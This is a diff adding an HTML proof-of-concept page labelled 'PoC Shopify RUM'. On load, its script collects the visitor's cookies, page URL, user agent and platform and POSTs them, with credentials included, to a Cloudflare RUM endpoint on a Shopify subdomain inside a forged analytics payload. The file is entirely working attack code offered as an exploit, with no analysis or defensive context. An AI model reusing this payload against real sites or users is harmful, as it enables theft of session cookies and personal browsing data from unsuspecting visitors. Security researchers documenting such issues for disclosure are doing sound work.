@@ -1,0 +1,36 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>PoC Shopify RUM</title>
+</head>
+<body>
+  <script>
+    const data = {
+      cookies: document.cookie,
+      location: location.href,
+      ua: navigator.userAgent,
+      platform: navigator.platform,
+      ts: Date.now()
+    };
+
+    fetch("https://collabs.shopify.com/cdn-cgi/rum?", {
+      method: "POST",
+      credentials: "include",
+      headers: {
+        "Content-Type": "application/json"
+      },
+      body: JSON.stringify({
+        referrer: "https://api.collabs.shopify.com/",
+        eventType: 3,
+        siteToken: "exploit",
+        location: "https://collabs.shopify.com/settings/notifications",
+        landingPath: "/",
+        startTime: Date.now(),
+        serverTimings: [],
+        st: 1,
+        dump: data
+      })
+    });
+  </script>
+</body>
+</html>
